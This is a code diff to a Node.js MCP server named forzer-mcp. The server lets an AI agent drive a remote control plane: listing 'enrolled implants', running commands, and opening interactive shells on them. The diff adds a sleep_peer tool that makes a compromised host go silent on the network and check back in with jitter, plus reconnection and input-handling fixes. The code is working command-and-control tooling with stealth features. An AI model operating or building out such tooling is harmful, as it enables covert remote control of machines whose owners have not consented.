@@ -5,7 +5,7 @@
  *
  * Exposes the control-plane as MCP tools so a client (or the agent dev)
  * can drive it "for real" against a live server + agent:
- *   - list_peers      : current mesh
+ *   - list_peers      : enrolled implants
  *   - run_command     : one-shot command on a peer (returns rc + output)
  *   - terminal_start  : open an interactive shell session on a peer
  *   - terminal_input  : send keystrokes / Ctrl-C to a session
@@ -15,7 +15,7 @@
  * Usage: node mcp-server.js   (env: FORZER_MCP_URL, FORZER_MCP_USER/PASS)
  */
 
-const WebSocket = require('ws');
+/* No `ws` here: Node 22+ provides a WHATWG WebSocket client as a global. */
 const readline = require('readline');
 
 const CTRL_URL = process.env.FORZER_MCP_URL ||
@@ -30,21 +30,71 @@ let reqId = 0;
 let pending = {};            // request id -> {resolve, reject, timer}
 const termBuffers = {};      // session id -> string
 const termExit = {};         // session id -> rc
+const termPeer = {};         // session id -> peer id
+// A terminal that nobody reads would grow without bound; keep the tail only.
+const MAX_TERM_BUF = 1 << 20;
+const RECONNECT_MS = 2000;
+let reconnecting = false;
+
+function wsOpen() {
+  return !!ws && ws.readyState === WebSocket.OPEN;
+}
+
+function failAllPending(err) {
+  for (const id of Object.keys(pending)) {
+    const p = pending[id];
+    if (!p) continue;
+    clearTimeout(p.timer);
+    delete pending[id];
+    p.reject(err);
+  }
+}
+
+/* The control plane can restart at any time (Render free tier does it often).
+   Without this the process stayed alive on a dead socket, served a frozen peer
+   list forever, and every run_command silently timed out. */
+function scheduleReconnect() {
+  if (reconnecting) return;
+  reconnecting = true;
+  setTimeout(reconnect, RECONNECT_MS);
+}
+
+async function reconnect() {
+  reconnecting = false;
+  try {
+    await connect();
+    process.stderr.write('forzer-mcp: reconnected to the control plane\n');
+  } catch (e) {
+    scheduleReconnect();
+  }
+}
 
 function connect() {
   return new Promise((resolve, reject) => {
     const url = CTRL_URL.replace(/^http/, 'ws');
-    ws = new WebSocket(url);
-    ws.on('open', () => {
-      ws.send(JSON.stringify({ type: 'dashboard', user: DASH_USER, pass: DASH_PASS }));
+    const sock = new WebSocket(url);
+    ws = sock;
+    let settled = false;
+    const fail = (e) => { if (!settled) { settled = true; reject(e); } };
+    sock.addEventListener('open', () => {
+      sock.send(JSON.stringify({ type: 'dashboard', user: DASH_USER, pass: DASH_PASS }));
     });
-    ws.on('message', (raw) => {
+    /* Built-in WebSocket delivers a MessageEvent; the `ws` package delivered the
+       raw payload. `error` arrives as an Event, so re-wrap it rather than
+       rejecting with something that has no message. */
+    sock.addEventListener('message', (ev) => {
       let msg;
-      try { msg = JSON.parse(raw); } catch { return; }
-      if (msg.type === 'dashboard-ready') { viewerId = msg.id; resolve(); }
-      else if (msg.type === 'dashboard-auth' && !msg.ok) { reject(new Error(msg.error || 'auth failed')); }
-      else if (msg.type === 'map') { peers = msg.peers || []; }
-      else if (msg.type === 'command-result') {
+      try { msg = JSON.parse(ev.data); } catch { return; }
+      if (!msg || typeof msg !== 'object') return;
+      if (msg.type === 'dashboard-ready') {
+        viewerId = msg.id;
+        if (!settled) { settled = true; resolve(); }
+      } else if (msg.type === 'dashboard-auth' && !msg.ok) {
+        fail(new Error(msg.error || 'auth failed'));
+      } else if (msg.type === 'implants' || msg.type === 'map') {
+        /* `implants` is current; `map` is the pre-identity frame type. */
+        peers = msg.implants || msg.peers || [];
+      } else if (msg.type === 'command-result' || msg.type === 'cancel-result') {
         const p = pending[msg.id];
         if (p) { clearTimeout(p.timer); delete pending[msg.id]; p.resolve(msg); }
       }
@@ -53,24 +103,40 @@ function connect() {
         if (p) { clearTimeout(p.timer); delete pending[msg.id]; p.reject(new Error(msg.error || 'command failed')); }
       }
       else if (msg.type === 'term-data' && msg.id) {
-        termBuffers[msg.id] = (termBuffers[msg.id] || '') + (msg.data ? Buffer.from(msg.data, 'base64').toString() : '');
+        const add = msg.data ? Buffer.from(msg.data, 'base64').toString() : '';
+        const cur = (termBuffers[msg.id] || '') + add;
+        termBuffers[msg.id] = cur.length > MAX_TERM_BUF ? cur.slice(-MAX_TERM_BUF) : cur;
       }
       else if (msg.type === 'term-exit' && msg.id) {
-        termExit[msg.id] = msg.rc;
+        termExit[msg.id] = msg.rc === undefined ? -1 : msg.rc;
       }
     });
-    ws.on('error', reject);
+    sock.addEventListener('error', () => fail(new Error('websocket error')));
+    sock.addEventListener('close', () => {
+      if (ws === sock) ws = null;
+      failAllPending(new Error('control plane connection lost'));
+      scheduleReconnect();
+    });
   });
 }
 
 function send(obj, timeoutMs = 15000) {
   return new Promise((resolve, reject) => {
+    if (!wsOpen()) {
+      reject(new Error('not connected to the control plane'));
+      return;
+    }
     const id = 'm' + (++reqId);
     const timer = setTimeout(() => { delete pending[id]; reject(new Error('timeout')); }, timeoutMs);
     pending[id] = { resolve, reject, timer };
     obj.id = id;
     ws.send(JSON.stringify(obj));
   });
+}
+
+function sendNow(obj) {
+  if (!wsOpen()) throw new Error('not connected to the control plane');
+  ws.send(JSON.stringify(obj));
 }
 
 function peerIdByNameOrId(ref) {
@@ -84,7 +150,7 @@ function peerIdByNameOrId(ref) {
 const TOOLS = [
   {
     name: 'list_peers',
-    description: 'List currently connected mesh peers (id, name, ip).',
+    description: 'List enrolled implants (id, name, online state, last seen). Reports whether the control-plane link is live.',
     inputSchema: { type: 'object', properties: {} },
   },
   {
@@ -127,17 +193,46 @@ const TOOLS = [
     description: 'Close a terminal session.',
     inputSchema: { type: 'object', properties: { session: { type: 'string' } }, required: ['session'] },
   },
+  {
+    name: 'cancel_command',
+    description: 'Stop the command a peer is currently running. The peer runs one command at a time, ' +
+      'so there is nothing to name. Returns "cancelled" or "nothing was running"; the killed ' +
+      "command's own result still arrives separately with rc=124. Does not affect terminal sessions " +
+      '— use terminal_end for those.',
+    inputSchema: {
+      type: 'object',
+      properties: { peer: { type: 'string', description: 'peer id or name' } },
+      required: ['peer'],
+    },
+  },
+  {
+    name: 'sleep_peer',
+    description: 'Tell a peer to disconnect and stay off the network for a while, then check back in. ' +
+      'Use this to make an idle host generate no traffic at all. Fire-and-forget: nothing is returned, ' +
+      'and the peer shows as offline until it wakes. The server caps this at one hour.',
+    inputSchema: {
+      type: 'object',
+      properties: {
+        peer: { type: 'string', description: 'peer id or name' },
+        seconds: { type: 'number', description: 'how long to stay quiet (0-3600, default 900)' },
+      },
+      required: ['peer'],
+    },
+  },
 ];
 
 function callTool(name, args) {
   switch (name) {
-    case 'list_peers':
-      return { content: [{ type: 'text', text: JSON.stringify(peers, null, 2) }] };
+    case 'list_peers': {
+      // Say so when the link is down, instead of reporting a stale empty mesh.
+      const text = JSON.stringify({ connected: wsOpen(), peers }, null, 2);
+      return { content: [{ type: 'text', text }] };
+    }
     case 'run_command': {
       const to = peerIdByNameOrId(args.peer);
       if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
-      const id = 'c' + (++reqId);
-      return send({ type: 'command', to, id, data: args.command }).then((m) => ({
+      // `send` assigns the request id; no need to pre-generate one.
+      return send({ type: 'command', to, data: args.command }).then((m) => ({
         content: [{ type: 'text', text: `rc=${m.rc}\n${m.data || ''}` }],
       }));
     }
@@ -147,12 +242,49 @@ function callTool(name, args) {
       const session = args.session || ('s' + (++reqId));
       termBuffers[session] = '';
       delete termExit[session];
-      ws.send(JSON.stringify({ type: 'term-start', to, id: session }));
+      // Remember which host the session lives on. The control plane reads a
+      // missing `to` as "the first peer", so input used to land on whichever
+      // machine happened to register first rather than the one we opened.
+      termPeer[session] = to;
+      try {
+        sendNow({ type: 'term-start', to, id: session });
+      } catch (e) {
+        delete termPeer[session];
+        return { content: [{ type: 'text', text: e.message }], isError: true };
+      }
       return { content: [{ type: 'text', text: `session ${session} started on ${to}` }] };
     }
+    case 'cancel_command': {
+      const to = peerIdByNameOrId(args.peer);
+      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
+      return send({ type: 'cancel', to }).then((m) => ({
+        content: [{ type: 'text', text: m.rc === 0 ? 'cancelled' : 'nothing was running' }],
+      }));
+    }
+    case 'sleep_peer': {
+      const to = peerIdByNameOrId(args.peer);
+      if (!to) return { content: [{ type: 'text', text: 'peer not found' }], isError: true };
+      const secs = args.seconds === undefined ? 900 : Number(args.seconds);
+      if (!Number.isFinite(secs) || secs < 0 || secs > 3600) {
+        return { content: [{ type: 'text', text: 'seconds must be between 0 and 3600' }], isError: true };
+      }
+      try {
+        sendNow({ type: 'sleep', to, ms: Math.round(secs * 1000) });
+      } catch (e) {
+        return { content: [{ type: 'text', text: e.message }], isError: true };
+      }
+      return { content: [{ type: 'text',
+        text: `${to} will disconnect now and check back in about ${Math.round(secs / 60) || '<1'} min (plus jitter)` }] };
+    }
     case 'terminal_input': {
+      const to = termPeer[args.session];
+      if (!to) return { content: [{ type: 'text', text: 'unknown session — call terminal_start first' }], isError: true };
       const b64 = Buffer.from(args.data, 'binary').toString('base64');
-      ws.send(JSON.stringify({ type: 'term-input', to: '', id: args.session, data: b64 }));
+      try {
+        sendNow({ type: 'term-input', to, id: args.session, data: b64 });
+      } catch (e) {
+        return { content: [{ type: 'text', text: e.message }], isError: true };
+      }
       return { content: [{ type: 'text', text: 'sent' }] };
     }
     case 'terminal_read': {
@@ -162,7 +294,11 @@ function callTool(name, args) {
       return { content: [{ type: 'text', text: out + exited }] };
     }
     case 'terminal_end': {
-      ws.send(JSON.stringify({ type: 'term-end', to: '', id: args.session }));
+      const to = termPeer[args.session];
+      if (to) {
+        try { sendNow({ type: 'term-end', to, id: args.session }); } catch (e) { /* session is gone anyway */ }
+      }
+      delete termPeer[args.session];
       delete termBuffers[args.session];
       delete termExit[args.session];
       return { content: [{ type: 'text', text: 'ended' }] };
@@ -173,13 +309,22 @@ function callTool(name, args) {
 }
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: false });
-let buf = '';
 
+/* The stdio transport is newline-delimited JSON: one object per line. The old
+   code concatenated lines into a buffer that was only cleared on a *successful*
+   parse, so one malformed line wedged the server permanently and it answered
+   nothing for the rest of the session. */
 rl.on('line', (line) => {
-  buf += line;
+  const s = line.trim();
+  if (!s) return;
   let msg;
-  try { msg = JSON.parse(buf); } catch { return; } // wait for full JSON
-  buf = '';
+  try {
+    msg = JSON.parse(s);
+  } catch {
+    process.stderr.write('forzer-mcp: ignoring unparseable line: ' + s.slice(0, 120) + '\n');
+    return;
+  }
+  if (!msg || typeof msg !== 'object' || Array.isArray(msg)) return;
   handle(msg);
 });
 
